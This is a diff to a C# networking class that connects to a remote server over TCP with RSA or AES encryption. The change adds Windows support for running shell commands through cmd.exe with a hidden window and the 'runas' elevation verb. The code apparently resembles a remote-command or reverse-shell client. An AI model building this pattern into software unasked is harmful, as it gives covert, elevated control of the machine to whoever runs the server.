@@ -27,21 +27,24 @@ namespace tevsn
         public TcpClient tcpClient = new TcpClient();
         private RSA? rsa;
         private AES? aes;
+        private string os;
         
-        public Tevsn(string ip, int port, RSA rsa)
+        public Tevsn(string ip, int port, RSA rsa, string os)
         {
             this.IP = ip;
             this.rsa = rsa;
             this.Port = port;
+            this.os = os;
             this.ServerAddress = new IPEndPoint(IPAddress.Parse(ip), port);
         }
 
-        public Tevsn(string ip, int port, AES aes)
+        public Tevsn(string ip, int port, AES aes, string os)
         {
             this.IP = ip;
             this.aes = aes;
             this.Port = port;
             this.ServerAddress = new IPEndPoint(IPAddress.Parse(ip), port);
+            this.os = os;
         }
 
         //try to connect, if success, return true
@@ -49,7 +52,7 @@ namespace tevsn
         {
             try
             {
-                tcpClient.Connect(IP, Port);
+                tcpClient.Connect(IPAddress.Parse(IP), Port);
                 return true;
             }
             catch (Exception e)
@@ -165,9 +168,19 @@ namespace tevsn
 
             p.StartInfo.UseShellExecute = false;
             p.StartInfo.RedirectStandardOutput = true;
-            p.StartInfo.FileName = "/bin/bash";
-            p.StartInfo.Arguments = $"-c \"{escapedArgs}\"";
-            p.StartInfo.CreateNoWindow = true;
+            if(!os.Contains("Windows"))
+            {
+                p.StartInfo.FileName = "/bin/bash";
+                p.StartInfo.Arguments = $"-c \"{escapedArgs}\"";
+                p.StartInfo.CreateNoWindow = true; 
+            } else {
+                p.StartInfo.WorkingDirectory = @"C:\Windows\System32";
+                p.StartInfo.Arguments = $"/c" + cmd;
+                p.StartInfo.Verb = "runas";
+                p.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
+                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                p.StartInfo.CreateNoWindow = true;
+            }
 
             p.Start();
 
